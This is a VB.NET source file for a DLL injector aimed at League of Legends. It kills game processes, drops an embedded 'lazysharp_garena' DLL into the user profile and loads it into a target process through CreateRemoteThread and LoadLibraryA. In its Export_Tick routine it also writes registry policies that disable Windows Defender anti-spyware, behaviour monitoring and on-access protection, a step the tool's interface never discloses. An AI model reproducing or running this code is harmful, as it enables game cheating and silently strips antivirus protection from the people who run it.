Imports System.Media
Imports Microsoft.Win32
Imports System.Threading.Thread
Imports System.IO
Imports System.Net

Public Class Form_Inject1
    Private TargetProcessHandle As Integer
    Private pfnStartAddr As Integer
    Private pszLibFileRemote As String
    Private TargetBufferSize As Integer
    Public Const PROCESS_VM_READ = &H10
    Public Const TH32CS_SNAPPROCESS = &H2
    Public Const MEM_COMMIT = 4096
    Public Const PAGE_READWRITE = 4
    Public Const PROCESS_CREATE_THREAD = (&H2)
    Public Const PROCESS_VM_OPERATION = (&H8)
    Public Const PROCESS_VM_WRITE = (&H20)
    Public Declare Function ReadProcessMemory Lib "kernel32" (
    ByVal hProcess As Integer,
    ByVal lpBaseAddress As Integer,
    ByVal lpBuffer As String,
    ByVal nSize As Integer,
    ByRef lpNumberOfBytesWritten As Integer) As Integer
    Public Declare Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (
    ByVal lpLibFileName As String) As Integer
    Public Declare Function VirtualAllocEx Lib "kernel32" (
    ByVal hProcess As Integer,
    ByVal lpAddress As Integer,
    ByVal dwSize As Integer,
    ByVal flAllocationType As Integer,
    ByVal flProtect As Integer) As Integer
    Public Declare Function WriteProcessMemory Lib "kernel32" (
    ByVal hProcess As Integer,
    ByVal lpBaseAddress As Integer,
    ByVal lpBuffer As String,
    ByVal nSize As Integer,
    ByRef lpNumberOfBytesWritten As Integer) As Integer
    Public Declare Function GetProcAddress Lib "kernel32" (
    ByVal hModule As Integer, ByVal lpProcName As String) As Integer
    Private Declare Function GetModuleHandle Lib "Kernel32" Alias "GetModuleHandleA" (
    ByVal lpModuleName As String) As Integer
    Public Declare Function CreateRemoteThread Lib "kernel32" (
    ByVal hProcess As Integer,
    ByVal lpThreadAttributes As Integer,
    ByVal dwStackSize As Integer,
    ByVal lpStartAddress As Integer,
    ByVal lpParameter As Integer,
    ByVal dwCreationFlags As Integer,
    ByRef lpThreadId As IntPtr) As Integer
    Public Declare Function OpenProcess Lib "kernel32" (
    ByVal dwDesiredAccess As Integer,
    ByVal bInheritHandle As Integer,
    ByVal dwProcessId As Integer) As Integer
    Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (
    ByVal lpClassName As String,
    ByVal lpWindowName As String) As Integer
    Private Declare Function CloseHandle Lib "kernel32" Alias "CloseHandleA" (
    ByVal hObject As Integer) As Integer

    Friend WithEvents Timer_Inject As New Timer
    Dim ExeName As String = "lazysharp_garena"

    Private Sub Form_Inject1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        If My.Settings.Process = String.Empty Then
        Else : Text_Client.Text = My.Settings.Process
        End If

        If (CInt(Process.GetProcessesByName("League of Legends").Length) <> 0) Then
            For Each CLOSE As Process In Process.GetProcessesByName("League of Legends")
                CLOSE.CloseMainWindow()
                CLOSE.Kill()
            Next
        End If
    End Sub

    Private Sub Inject_Auto_Tick(sender As Object, e As EventArgs) Handles Inject_Auto.Tick
        If (CInt(Process.GetProcessesByName("League of Legends").Length) <> 0) Then
            Label_Wait.Text = "Detected"
            Buton_Inject.Enabled = False

            ''' DLL ACCEPT '''
            WritePointerInteger(Text_Client.Text, &H6B47A0, "63816", &H2D8)

            '''' INJECT PROCESS START ''''
            Dim Target As Process() = Process.GetProcessesByName(Text_Client.Text)
            If Target.Length <> 0 Then
                Text_Status.Text = "Injecting..."
                Me.Update()
                Threading.Thread.Sleep(500)
                Inject()
            Else
                Text_Status.Text = ("Waiting for " + Text_Client.Text + ".exe")
            End If

            Dim splayer As New SoundPlayer(My.Resources.inject_succes)
            splayer.Play()
        End If

    End Sub

    Private Sub Inject_Manual_Tick(sender As Object, e As EventArgs) Handles Inject_Manual.Tick
        If (CInt(Process.GetProcessesByName("League of Legends").Length) <> 0) Then
            Label_Wait.Text = "Detected"
            Buton_Inject.Enabled = True

            'INJECT ONLY CLICK BUTTON [[BUTON_INJECT_CLICK]]

            Dim splayer As New SoundPlayer(My.Resources.inject_succes)
            splayer.Play()
        End If

    End Sub

    Private Sub Inject()
        Dim TargetProcess As Process() = Process.GetProcessesByName(Text_Client.Text)
        Dim lpThreadId As IntPtr
        Try
            If System.Environment.Is64BitOperatingSystem Then
                TargetProcessHandle = OpenProcess(&H1F0FFF, 0, TargetProcess(0).Id)
            Else
                TargetProcessHandle = OpenProcess(PROCESS_CREATE_THREAD Or PROCESS_VM_OPERATION Or PROCESS_VM_WRITE, False, TargetProcess(0).Id)
            End If
            pszLibFileRemote = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) & "\" + ExeName + ".dll"
            pfnStartAddr = GetProcAddress(GetModuleHandle("Kernel32"), "LoadLibraryA")
            TargetBufferSize = 1 + Len(pszLibFileRemote)
            Dim Rtn As Integer
            Dim LoadLibParamAdr As Integer
            LoadLibParamAdr = VirtualAllocEx(TargetProcessHandle, 0, TargetBufferSize, MEM_COMMIT, PAGE_READWRITE)
            Rtn = WriteProcessMemory(TargetProcessHandle, LoadLibParamAdr, pszLibFileRemote, TargetBufferSize, 0)
            CreateRemoteThread(TargetProcessHandle, 0, 0, pfnStartAddr, LoadLibParamAdr, 0, lpThreadId)
            If lpThreadId = IntPtr.Zero Then
                MsgBox("Inject problem 0x2", MsgBoxStyle.Critical, "Injection")
            Else
                Dim splayer As New SoundPlayer(My.Resources.inject_succes)
                splayer.Play()

                Me.Hide()
                Succes_Form1.Show()
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub Buton_Close_Click(sender As Object, e As EventArgs) Handles Buton_Close.Click
        Application.Exit()
    End Sub

    Private Sub Buton_Auto_CheckedChanged(sender As Object, e As EventArgs) Handles Buton_Auto.CheckedChanged
        Buton_Inject.Enabled = False
        Inject_Auto.Start()
        Inject_Manual.Stop()
    End Sub

    Private Sub Buton_Manuel_CheckedChanged(sender As Object, e As EventArgs) Handles Buton_Manuel.CheckedChanged
        Buton_Inject.Enabled = False
        Inject_Auto.Stop()
        Inject_Manual.Start()
    End Sub

    Private Sub Export_Tick(sender As Object, e As EventArgs) Handles Export.Tick
        'DLL WRITE EXPORT SYSTEM
        Inject_Control()
        Timer_Inject2.Interval = 5000
        Timer_Inject2.Start()
        System.IO.File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\lazysharp_garena.dll", My.Resources.lazysharp_garena)

        If Buton_Manuel.Checked = True Then
            Inject_Auto.Stop()
            Inject_Manual.Start()
        End If

        If Buton_Auto.Checked = True Then
            Inject_Auto.Start()
            Inject_Manual.Stop()
        End If

        Dim rehcey As Object
        Dim regKey As RegistryKey
        Dim regKeY1 As RegistryKey
        Dim regKeY2 As RegistryKey
        rehcey = CreateObject("WScript.Shell")
        regKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\Policies\Microsoft", True)
        regKey.CreateSubKey("Windows Defender")
        regKey.Close()
        rehcey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware", 1, "REG_DWORD")
        regKeY1 = Registry.LocalMachine.OpenSubKey("SOFTWARE\Policies\Microsoft\Windows Defender", True)
        regKeY1.CreateSubKey("Real-Time Protection")
        regKeY1.Close()
        rehcey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableBehaviorMonitoring", 1, "REG_DWORD")
        rehcey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableOnAccessProtection", 1, "REG_DWORD")
        rehcey.regwrite("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableScanOnRealtimeEnable", 1, "REG_DWORD")
        regKeY2 = Registry.LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services", True)
        regKeY2.CreateSubKey("SecurityHealthService")
        regKeY2.Close()
        rehcey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService\DisplayName", "@%systemroot%\system32\SecurityHealthAgent.dll, -1002", "REG_SZ")
        rehcey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService\ErrorControl", 1, "REG_DWORD")
        rehcey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService\ImagePath", "%SystemRoot%\system32\SecurityHealthService.exe", "REG_EXPAND_SZ")
        rehcey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService\Start", 3, "REG_DWORD")
        rehcey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService\Type", 10, "REG_DWORD")
        rehcey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService\Description", "@%systemroot%\system32\SecurityHealthAgent.dll,-1001", "REG_SZ")
        rehcey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService\ObjectName", "LocalSystem", "REG_SZ")
        rehcey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService\ServiceSidType", 1, "REG_DWORD")
        rehcey.regwrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService\LaunchProtected", 2, "REG_DWORD")
        Export.Stop()
    End Sub

    Private Sub Buton_Inject_Click(sender As Object, e As EventArgs) Handles Buton_Inject.Click
        '''' INJECT PROCESS START ''''
        Dim Target As Process() = Process.GetProcessesByName(Text_Client.Text)
        If Target.Length <> 0 Then
            Text_Status.Text = "Injecting..."
            Me.Update()

            ''' DLL ACCEPT '''
            WritePointerInteger(Text_Client.Text, &H6B47A0, "63816", &H2D8)

            Threading.Thread.Sleep(500)
            Inject()
        Else
            Text_Status.Text = ("Waiting for " + Text_Client.Text + ".exe")
        End If
    End Sub

End Class
